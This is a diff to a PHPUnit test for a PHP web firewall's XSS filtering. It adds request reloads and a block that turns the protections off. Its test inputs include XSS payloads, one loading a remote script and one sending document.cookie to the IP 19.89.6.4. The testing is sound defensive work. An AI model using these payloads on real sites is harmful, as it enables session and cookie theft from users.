@@ -74,6 +74,7 @@ class FirewallTest extends \PHPUnit\Framework\TestCase
         $_POST['test_one'] = '<script> alert(); </script>';
         $_COOKIE['test_two'] = '<script src="http://19.89.6.4/xss.js">';
         $_GET['test_three'] = '<script>new Image().src="http://19.89.6.4/test.php?output="+document.cookie;</script>';
+        reload_request();
 
         $firewall->run();
 
@@ -89,6 +90,7 @@ class FirewallTest extends \PHPUnit\Framework\TestCase
         $_POST['_test'] = '<script> alert(123); </script>';
         $_COOKIE['_test'] = '<script> alert(123); </script>';
         $_GET['_test'] = '<script> alert(123); </script>';
+        reload_request();
 
         $firewall->getKernel()->setIp('140.132.72.12');
 
@@ -102,6 +104,14 @@ class FirewallTest extends \PHPUnit\Framework\TestCase
         $firewall->setConfig('xss_protection.post', true);
         $firewall->setConfig('xss_protection.cookie', true);
         $firewall->setConfig('xss_protection.get', true);
+
+
+        $firewall->setConfig('xss_protection.post', false);
+        $firewall->setConfig('xss_protection.cookie', false);
+        $firewall->setConfig('xss_protection.get', false);
+        $firewall->setConfig('xss_protected_list', []);
+        $firewall->setup();
+        $firewall->run();
     }
 
     public function testImageCaptchaOption()
